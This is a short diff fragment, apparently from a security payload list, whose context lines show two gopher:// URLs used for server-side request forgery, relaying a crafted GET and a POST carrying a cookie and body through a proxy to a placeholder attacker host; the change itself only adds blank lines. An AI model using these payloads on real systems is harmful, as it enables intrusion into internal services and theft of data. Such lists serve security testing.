@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:23:58.744109+00:00'
 gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
 gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
 ```
+
+
